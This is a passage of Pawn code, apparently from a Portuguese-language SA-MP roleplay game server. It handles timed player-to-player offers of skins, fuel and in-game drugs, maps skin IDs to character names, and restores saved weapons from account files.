		SendClientFormat(playerid, -1, "%s ofereceu pra você a skin ID %d. (/sAceitar | /sRecusar)", PlayerName(_SKIN_PID[playerid]), _SKIN_SID[playerid]);
		SendClientFormat(_SKIN_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Skin)", PlayerName(playerid));
		_SKIN_Mensagem[playerid] ++;	_SKIN_Timer[playerid] = SetTimerEx("Skin", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarSkin(playerid);
public LiberarSkin(playerid)
{
    _SKIN_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais skin.");
	return 1;
}

forward GASO(playerid);
public GASO(playerid)
{
	if(GASO_Mensagem[playerid] >= 5)
	{
	    KillTimer(GASO_Timer[playerid]); KillTimer(GASO_Timer[GASO_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta do Combustivel foi cancelada!", PlayerName(GASO_PID[playerid]));
		SendClientFormat(GASO_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		GASO_Oferecido[GASO_PID[playerid]] = 0;
		GASO_IID[GASO_PID[playerid]] = -1;
		GASO_Recebido[playerid] = 0;
		GASO_Mensagem[playerid] = 0;
		GASO_VALOR[playerid] = 0;
		GASO_PID[playerid] = -1;
		GASO_SID[playerid] = 0;
		return 1;
	}
	if(GASO_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu pra você o Combustivel ID %d. (/cAceitar | /cRecusar)", PlayerName(GASO_PID[playerid]), GASO_SID[playerid]);
		SendClientFormat(GASO_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Combustivel)", PlayerName(playerid));
		GASO_Mensagem[playerid] ++;	GASO_Timer[playerid] = SetTimerEx("Skin", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarGaso(playerid);
public LiberarGaso(playerid)
{
    GASO_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais Combustivel.");
	return 1;
}

forward Maconha(playerid);
public Maconha(playerid)
{
	if(Maconha_Mensagem[playerid] >= 5)
	{
	    KillTimer(Maconha_Timer[playerid]); KillTimer(Maconha_Timer[Maconha_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta da maconha foi cancelada!", PlayerName(Maconha_PID[playerid]));
		SendClientFormat(Maconha_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		Maconha_Oferecido[Maconha_PID[playerid]] = 0;
		Maconha_IID[Maconha_PID[playerid]] = -1;
		Maconha_Recebido[playerid] = 0;
		Maconha_Mensagem[playerid] = 0;
		Maconha_VALOR[playerid] = 0;
		Maconha_PID[playerid] = -1;
		Maconha_QTD[playerid] = 0;
		return 1;
	}
	if(Maconha_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu pra você %d parangas de maconha. (/mAceitar | /mRecusar)", PlayerName(Maconha_PID[playerid]), Maconha_QTD[playerid]);
		SendClientFormat(Maconha_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Maconha)", PlayerName(playerid));
		Maconha_Mensagem[playerid] ++;	Maconha_Timer[playerid] = SetTimerEx("Maconha", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarMaconha(playerid);
public LiberarMaconha(playerid)
{
    Maconha_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais maconha.");
	return 1;
}

forward Farinha(playerid);
public Farinha(playerid)
{
	if(Farinha_Mensagem[playerid] >= 5)
	{
	    KillTimer(Farinha_Timer[playerid]); KillTimer(Farinha_Timer[Farinha_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta da cocaína foi cancelada!", PlayerName(Farinha_PID[playerid]));
		SendClientFormat(Farinha_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		Farinha_Oferecido[Farinha_PID[playerid]] = 0;
		Farinha_IID[Farinha_PID[playerid]] = -1;
		Farinha_Recebido[playerid] = 0;
		Farinha_Mensagem[playerid] = 0;
		Farinha_VALOR[playerid] = 0;
		Farinha_PID[playerid] = -1;
		Farinha_QTD[playerid] = 0;
		return 1;
	}
	if(Farinha_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu pra você %d pinos de cocaína. (/fAceitar | /fRecusar)", PlayerName(Farinha_PID[playerid]), Farinha_QTD[playerid]);
		SendClientFormat(Farinha_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Cocaína)", PlayerName(playerid));
		Farinha_Mensagem[playerid] ++;	Farinha_Timer[playerid] = SetTimerEx("Farinha", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarFarinha(playerid);
public LiberarFarinha(playerid)
{
    Farinha_Oferecido[playerid] = 0; SendClientMessage(playerid, -1, "Você já pode vender mais cocaína.");
	return 1;
}

forward Crack(playerid);
public Crack(playerid)
{
	if(Crack_Mensagem[playerid] >= 5)
	{
	    KillTimer(Crack_Timer[playerid]); KillTimer(Crack_Timer[Crack_PID[playerid]]);
		SendClientFormat(playerid, -1, "Você demorou muito para responder %s e a oferta do crack foi cancelada!", PlayerName(Crack_PID[playerid]));
		SendClientFormat(Crack_PID[playerid], -1, "%s demorou para responder e sua oferta foi cancelada.", PlayerName(playerid));
		Crack_Oferecido[Crack_PID[playerid]] = 0;
		Crack_IID[Crack_PID[playerid]] = -1;
		Crack_Recebido[playerid] = 0;
		Crack_Mensagem[playerid] = 0;
		Crack_VALOR[playerid] = 0;
		Crack_PID[playerid] = -1;
		Crack_QTD[playerid] = 0;
		return 1;
	}
	if(Crack_Mensagem[playerid] < 5)
	{
		SendClientFormat(playerid, -1, "%s ofereceu pra você %d pedras de crack. (/cAceitar | /cRecusar)", PlayerName(Crack_PID[playerid]), Crack_QTD[playerid]);
		SendClientFormat(Crack_PID[playerid], -1, "Aguardando a reposta de %s... (Oferta de Crack)", PlayerName(playerid));
		Crack_Mensagem[playerid] ++;	Crack_Timer[playerid] = SetTimerEx("Crack", 4000, false, "d", playerid);
		return 1;
	}
	return 1;
}

forward LiberarCrack(playerid);
public LiberarCrack(playerid)
{
    SendClientMessage(playerid, -1, "Você já pode vender mais crack.");
    Crack_Oferecido[playerid] = 0;
	return 1;
}

stock GetSkinName(skinid)
{
    new returnt[64];
    switch(skinid)
    {
        case 0  : { format(returnt, sizeof(returnt),  "Carl CJ Johnson"); }
        case 1  : { format(returnt, sizeof(returnt),  "The Truth"); }
        case 2  : { format(returnt, sizeof(returnt),  "Maccer"); }
        case 3  : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 4  : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 5  : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 6  : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 7  : { format(returnt, sizeof(returnt),  "Taxi Driver/Train Driver"); }
        case 8  : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 9  : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 10 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 11 : { format(returnt, sizeof(returnt),  "Casino Worker"); }
        case 12 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 13 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 14 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 15 : { format(returnt, sizeof(returnt),  "RS Haul Owner"); }
        case 16 : { format(returnt, sizeof(returnt),  "Airport Ground Worker"); }
        case 17 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 18 : { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 19 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 20 : { format(returnt, sizeof(returnt),  "Madd Dogg's Manager"); }
        case 21 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 22 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 23 : { format(returnt, sizeof(returnt),  "BMXer"); }
        case 24 : { format(returnt, sizeof(returnt),  "Madd Dogg Bodyguard"); }
        case 25 : { format(returnt, sizeof(returnt),  "Madd Dogg Bodyguard"); }
        case 26 : { format(returnt, sizeof(returnt),  "Mountain Climber"); }
        case 27 : { format(returnt, sizeof(returnt),  "Builder"); }
        case 28 : { format(returnt, sizeof(returnt),  "Drug Dealer"); }
        case 29 : { format(returnt, sizeof(returnt),  "Drug Dealer"); }
        case 30 : { format(returnt, sizeof(returnt),  "Drug Dealer"); }
        case 31 : { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 32 : { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 33 : { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 34 : { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 35 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 36 : { format(returnt, sizeof(returnt),  "Golfer"); }
        case 37 : { format(returnt, sizeof(returnt),  "Golfer"); }
        case 38 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 39 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 40 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 41 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 42 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 43 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 44 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 45 : { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 46 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 47 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 48 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 49 : { format(returnt, sizeof(returnt),  "Snakehead (Da Nang)"); }
        case 50 : { format(returnt, sizeof(returnt),  "Mechanic"); }
        case 51 : { format(returnt, sizeof(returnt),  "Mountain Biker"); }
        case 52 : { format(returnt, sizeof(returnt),  "Mountain Biker"); }
        case 53 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 54 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 55 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 56 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 57 : { format(returnt, sizeof(returnt),  "Feds"); }
        case 58 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 59 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 60 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 61 : { format(returnt, sizeof(returnt),  "Pilot"); }
        case 62 : { format(returnt, sizeof(returnt),  "Colonel Fuhrberger"); }
        case 63 : { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 64 : { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 65 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 66 : { format(returnt, sizeof(returnt),  "Pool Player"); }
        case 67 : { format(returnt, sizeof(returnt),  "Pool Player"); }
        case 68 : { format(returnt, sizeof(returnt),  "Priest"); }
        case 69 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 70 : { format(returnt, sizeof(returnt),  "Scientist"); }
        case 71 : { format(returnt, sizeof(returnt),  "Security Guard"); }
        case 72 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 73 : { format(returnt, sizeof(returnt),  "Jethro"); }
        case 74 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 75 : { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 76 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 77 : { format(returnt, sizeof(returnt),  "Homeless"); }
        case 78 : { format(returnt, sizeof(returnt),  "Homeless"); }
        case 79 : { format(returnt, sizeof(returnt),  "Homeless"); }
        case 80 : { format(returnt, sizeof(returnt),  "Boxer"); }
        case 81 : { format(returnt, sizeof(returnt),  "Boxer"); }
        case 82 : { format(returnt, sizeof(returnt),  "Elvis Wannabe"); }
        case 83 : { format(returnt, sizeof(returnt),  "Elvis Wannabe"); }
        case 84 : { format(returnt, sizeof(returnt),  "Elvis Wannabe"); }
        case 85 : { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 86 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 87 : { format(returnt, sizeof(returnt),  "Whore"); }
        case 88 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 89 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 90 : { format(returnt, sizeof(returnt),  "Whore"); }
        case 91 : { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 92 : { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 93 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 94 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 95 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 96 : { format(returnt, sizeof(returnt),  "Jogger"); }
        case 97 : { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 98 : { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 99 : { format(returnt, sizeof(returnt),  "Skeelering"); }
        case 100: { format(returnt, sizeof(returnt),  "Biker"); }
        case 101: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 102: { format(returnt, sizeof(returnt),  "Balla"); }
        case 103: { format(returnt, sizeof(returnt),  "Balla"); }
        case 104: { format(returnt, sizeof(returnt),  "Balla"); }
        case 105: { format(returnt, sizeof(returnt),  "Grove Street Families"); }
        case 106: { format(returnt, sizeof(returnt),  "Grove Street Families"); }
        case 107: { format(returnt, sizeof(returnt),  "Grove Street Families"); }
        case 108: { format(returnt, sizeof(returnt),  "Los Santos Vagos"); }
        case 109: { format(returnt, sizeof(returnt),  "Los Santos Vagos"); }
        case 110: { format(returnt, sizeof(returnt),  "Los Santos Vagos"); }
        case 111: { format(returnt, sizeof(returnt),  "The Russian Mafia"); }
        case 112: { format(returnt, sizeof(returnt),  "The Russian Mafia"); }
        case 113: { format(returnt, sizeof(returnt),  "The Russian Mafia"); }
        case 114: { format(returnt, sizeof(returnt),  "Varios Los Aztecas"); }
        case 115: { format(returnt, sizeof(returnt),  "Varios Los Aztecas"); }
        case 116: { format(returnt, sizeof(returnt),  "Varios Los Aztecas"); }
        case 117: { format(returnt, sizeof(returnt),  "Traid"); }
        case 118: { format(returnt, sizeof(returnt),  "Traid"); }
        case 119: { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 120: { format(returnt, sizeof(returnt),  "Traid"); }
        case 121: { format(returnt, sizeof(returnt),  "Da Nang Boy"); }
        case 122: { format(returnt, sizeof(returnt),  "Da Nang Boy"); }
        case 123: { format(returnt, sizeof(returnt),  "Da Nang Boy"); }
        case 124: { format(returnt, sizeof(returnt),  "The Mafia"); }
        case 125: { format(returnt, sizeof(returnt),  "The Mafia"); }
        case 126: { format(returnt, sizeof(returnt),  "The Mafia"); }
        case 127: { format(returnt, sizeof(returnt),  "The Mafia"); }
        case 128: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 129: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 130: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 131: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 132: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 133: { format(returnt, sizeof(returnt),  "Farm Inhabitant"); }
        case 134: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 135: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 136: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 137: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 138: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 139: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 140: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 141: { format(returnt, sizeof(returnt),  "Office Worker"); }
        case 142: { format(returnt, sizeof(returnt),  "Taxi Driver"); }
        case 143: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 144: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 145: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 146: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 147: { format(returnt, sizeof(returnt),  "Director"); }
        case 148: { format(returnt, sizeof(returnt),  "Secretary"); }
        case 149: { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 150: { format(returnt, sizeof(returnt),  "Secretary"); }
        case 151: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 152: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 153: { format(returnt, sizeof(returnt),  "Coffee mam'"); }
        case 154: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 155: { format(returnt, sizeof(returnt),  "Well Stacked Pizza"); }
        case 156: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 157: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 158: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 159: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 160: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 161: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 162: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 163: { format(returnt, sizeof(returnt),  "Bouncer"); }
        case 164: { format(returnt, sizeof(returnt),  "Bouncer"); }
        case 165: { format(returnt, sizeof(returnt),  "MIB Agent"); }
        case 166: { format(returnt, sizeof(returnt),  "MIB Agent"); }
        case 167: { format(returnt, sizeof(returnt),  "Cluckin' Bell"); }
        case 168: { format(returnt, sizeof(returnt),  "Food Vendor"); }
        case 169: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 170: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 171: { format(returnt, sizeof(returnt),  "Casino Worker"); }
        case 172: { format(returnt, sizeof(returnt),  "Hotel Services"); }
        case 173: { format(returnt, sizeof(returnt),  "San Fierro Rifa"); }
        case 174: { format(returnt, sizeof(returnt),  "San Fierro Rifa"); }
        case 175: { format(returnt, sizeof(returnt),  "San Fierro Rifa"); }
        case 176: { format(returnt, sizeof(returnt),  "Tatoo Shop"); }
        case 177: { format(returnt, sizeof(returnt),  "Tatoo Shop"); }
        case 178: { format(returnt, sizeof(returnt),  "Whore"); }
        case 179: { format(returnt, sizeof(returnt),  "Ammu-Nation Salesmen"); }
        case 180: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 181: { format(returnt, sizeof(returnt),  "Punker"); }
        case 182: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 183: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 184: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 185: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 186: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 187: { format(returnt, sizeof(returnt),  "Buisnessman"); }
        case 188: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 189: { format(returnt, sizeof(returnt),  "Valet"); }
        case 190: { format(returnt, sizeof(returnt),  "Barbara Schternvart"); }
        case 191: { format(returnt, sizeof(returnt),  "Helena Wankstein"); }
        case 192: { format(returnt, sizeof(returnt),  "Michelle Cannes"); }
        case 193: { format(returnt, sizeof(returnt),  "Katie Zhan"); }
        case 194: { format(returnt, sizeof(returnt),  "Millie Perkins"); }
        case 195: { format(returnt, sizeof(returnt),  "Denise Robinson"); }
        case 196: { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 197: { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 198: { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 199: { format(returnt, sizeof(returnt),  "Farm-Town inhabitant"); }
        case 200: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 201: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 202: { format(returnt, sizeof(returnt),  "Farmer"); }
        case 203: { format(returnt, sizeof(returnt),  "Karate Teacher"); }
        case 204: { format(returnt, sizeof(returnt),  "Karate Teacher"); }
        case 205: { format(returnt, sizeof(returnt),  "Burger Shot Cashier"); }
        case 206: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 207: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 208: { format(returnt, sizeof(returnt),  "Well Stacked Pizza"); }
        case 209: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 210: { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 211: { format(returnt, sizeof(returnt),  "Shop Equipe {FF1E1E}WE{1E90FF}"); }
        case 212: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 213: { format(returnt, sizeof(returnt),  "Weird old man"); }
        case 214: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 215: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 216: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 217: { format(returnt, sizeof(returnt),  "Shop Equipe {FF1E1E}WE{1E90FF}"); }
        case 218: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 219: { format(returnt, sizeof(returnt),  "Secretary"); }
        case 220: { format(returnt, sizeof(returnt),  "Taxi Driver"); }
        case 221: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 222: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 223: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 224: { format(returnt, sizeof(returnt),  "Sofori"); }
        case 225: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 226: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 227: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 228: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 229: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 230: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 231: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 232: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 233: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 234: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 235: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 236: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 237: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 238: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 239: { format(returnt, sizeof(returnt),  "Homeless"); }
        case 240: { format(returnt, sizeof(returnt),  "The D.A"); }
        case 241: { format(returnt, sizeof(returnt),  "Afro-American"); }
        case 242: { format(returnt, sizeof(returnt),  "Mexican"); }
        case 243: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 244: { format(returnt, sizeof(returnt),  "Whore"); }
        case 245: { format(returnt, sizeof(returnt),  "Prostitute"); }
        case 246: { format(returnt, sizeof(returnt),  "Whore"); }
        case 247: { format(returnt, sizeof(returnt),  "Biker"); }
        case 248: { format(returnt, sizeof(returnt),  "Biker"); }
        case 249: { format(returnt, sizeof(returnt),  "Pimp"); }
        case 250: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 251: { format(returnt, sizeof(returnt),  "Beach Visitor"); }
        case 252: { format(returnt, sizeof(returnt),  "Naked Valet"); }
        case 253: { format(returnt, sizeof(returnt),  "Bus Driver"); }
        case 254: { format(returnt, sizeof(returnt),  "Drug Dealer"); }
        case 255: { format(returnt, sizeof(returnt),  "Limo Driver"); }
        case 256: { format(returnt, sizeof(returnt),  "Whore"); }
        case 257: { format(returnt, sizeof(returnt),  "Whore"); }
        case 258: { format(returnt, sizeof(returnt),  "Golfer"); }
        case 259: { format(returnt, sizeof(returnt),  "Golfer"); }
        case 260: { format(returnt, sizeof(returnt),  "Construction Site"); }
        case 261: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 262: { format(returnt, sizeof(returnt),  "Taxi Driver"); }
        case 263: { format(returnt, sizeof(returnt),  "Normal Ped"); }
        case 264: { format(returnt, sizeof(returnt),  "Clown"); }
        case 265: { format(returnt, sizeof(returnt),  "Tenpenny"); }
        case 266: { format(returnt, sizeof(returnt),  "Pulaski"); }
        case 267: { format(returnt, sizeof(returnt),  "Officer Frank Tenpenny (Crooked Cop)"); }
        case 268: { format(returnt, sizeof(returnt),  "Dwaine"); }
        case 269: { format(returnt, sizeof(returnt),  "Melvin Big Smoke Harris"); }
        case 270: { format(returnt, sizeof(returnt),  "Sweet "); }
        case 271: { format(returnt, sizeof(returnt),  "Lance Ryder Wilson"); }
        case 272: { format(returnt, sizeof(returnt),  "Mafia Boss"); }
        case 273: { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 274: { format(returnt, sizeof(returnt),  "Paramedic"); }
        case 275: { format(returnt, sizeof(returnt),  "Paramedic"); }
        case 276: { format(returnt, sizeof(returnt),  "Paramedic"); }
        case 277: { format(returnt, sizeof(returnt),  "Firefighter"); }
        case 278: { format(returnt, sizeof(returnt),  "Firefighter"); }
        case 279: { format(returnt, sizeof(returnt),  "Firefighter"); }
        case 280: { format(returnt, sizeof(returnt),  "Los Santos Police"); }
        case 281: { format(returnt, sizeof(returnt),  "San Fierro Police"); }
        case 282: { format(returnt, sizeof(returnt),  "Las Venturas Police"); }
        case 283: { format(returnt, sizeof(returnt),  "Country Sheriff"); }
        case 284: { format(returnt, sizeof(returnt),  "San Andreas Police Dept."); }
        case 285: { format(returnt, sizeof(returnt),  "S.W.A.T Special Forces"); }
        case 286: { format(returnt, sizeof(returnt),  "Federal Agents"); }
        case 287: { format(returnt, sizeof(returnt),  "San Andreas Army"); }
        case 288: { format(returnt, sizeof(returnt),  "Desert Sheriff"); }
        case 289: { format(returnt, sizeof(returnt),  "Outras Skins"); }
        case 290: { format(returnt, sizeof(returnt),  "Ken Rosenberg"); }
        case 291: { format(returnt, sizeof(returnt),  "Desert Sheriff"); }
        case 292: { format(returnt, sizeof(returnt),  "Cesar Vialpando"); }
        case 293: { format(returnt, sizeof(returnt),  "Jeffrey OG Loc Cross"); }
        case 294: { format(returnt, sizeof(returnt),  "Wu Zi Mu (Woozie)"); }
        case 295: { format(returnt, sizeof(returnt),  "Michael Toreno"); }
        case 296: { format(returnt, sizeof(returnt),  "Jizzy B."); }
        case 297: { format(returnt, sizeof(returnt),  "Madd Dogg"); }
        case 298: { format(returnt, sizeof(returnt),  "Catalina"); }
        case 299: { format(returnt, sizeof(returnt),  "Claude"); }
        default: { format(returnt, sizeof(returnt),  "Outras Skins"); }
    }
    return returnt;
}

stock IsValidVehicleHouse(v)
{
    if(vHouse[v] == 1) return false;
        else return true;
}

stock SetPlayerArmas(playerid)
{
    format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
	if(WE_GetInt(gFile, "GranadaGas") == 1)
	{
		GivePlayerWeapon(playerid, 17, 2); // Granada de Gás
	}
	if(WE_GetInt(gFile, "Granada") == 1)
	{
		GivePlayerWeapon(playerid, 16, 2); // Granada
	}
	/*if(WE_GetInt(gFile, "GarrafaFogo") == 1)
	{
		GivePlayerWeapon(playerid, 18, 10); // Garrafa de Fogo
	}*/
	if(WE_GetInt(gFile, "Pistola_9mm") == 1)
	{
		GivePlayerWeapon(playerid, 22, 67); // Pistola 9mm
	}
	if(WE_GetInt(gFile, "Pistola_S9mm") == 1)
	{
		GivePlayerWeapon(playerid, 23, 57); // Pistola Silenciosa 9mm
	}
	if(WE_GetInt(gFile, "Pistola_Emm") == 1)
	{
		GivePlayerWeapon(playerid, 24, 37); // Pistola Desert Eagle
	}
	if(WE_GetInt(gFile, "Shotgun") == 1)
	{
		GivePlayerWeapon(playerid, 25, 30); // Shotgun
	}
	/*if(WE_GetInt(gFile, "sOfShotgun") == 1)
	{
		GivePlayerWeapon(playerid, 26, 800); // Sawn-off Shotgun
	}*/
	if(WE_GetInt(gFile, "CombatShotgun") == 1)
	{
		GivePlayerWeapon(playerid, 27, 50); // Combat Shotgun
	}
	/*if(WE_GetInt(gFile, "MicroSMG") == 1)
	{
		GivePlayerWeapon(playerid, 28, 800); // Metralhadora Micro SMG
	}*/
	if(WE_GetInt(gFile, "MP5") == 1)
	{
		GivePlayerWeapon(playerid, 29, 600); // Metralhadora MP5
	}
	if(WE_GetInt(gFile, "AK47") == 1)
	{
		GivePlayerWeapon(playerid, 30, 450); // Metralhadora AK-47
	}
	if(WE_GetInt(gFile, "M4") == 1)
	{
		GivePlayerWeapon(playerid, 31, 450); // Metralhadora M4
	}
	/*if(WE_GetInt(gFile, "Tec9") == 1)
	{
		GivePlayerWeapon(playerid, 32, 800); // Metralhadora Tec9
	}*/
	if(WE_GetInt(gFile, "Rifle") == 1)
	{
		GivePlayerWeapon(playerid, 33, 20); // Rifle
	}
	if(WE_GetInt(gFile, "Sniper") == 1)
	{
		GivePlayerWeapon(playerid, 34, 20); // Sniper Rifle
	}
	if(WE_GetInt(gFile, "SocoIngles") == 1)
	{
		GivePlayerWeapon(playerid, 1, 1); // Soco Inglês
	}
	if(WE_GetInt(gFile, "TacoGolf") == 1)
	{
		GivePlayerWeapon(playerid, 2, 1); // Taco de Golf
	}
	if(WE_GetInt(gFile, "Cacetete") == 1)
	{
		GivePlayerWeapon(playerid, 3, 1); // Cacetete
	}
	if(WE_GetInt(gFile, "Faca") == 1)
	{
		GivePlayerWeapon(playerid, 4, 1); // Faca
	}
	if(WE_GetInt(gFile, "Baseball") == 1)
	{
		GivePlayerWeapon(playerid, 5, 1); // Taco de Baseball
	}
	if(WE_GetInt(gFile, "Inchada") == 1)
	{
		GivePlayerWeapon(playerid, 6, 1); // Inchada
	}
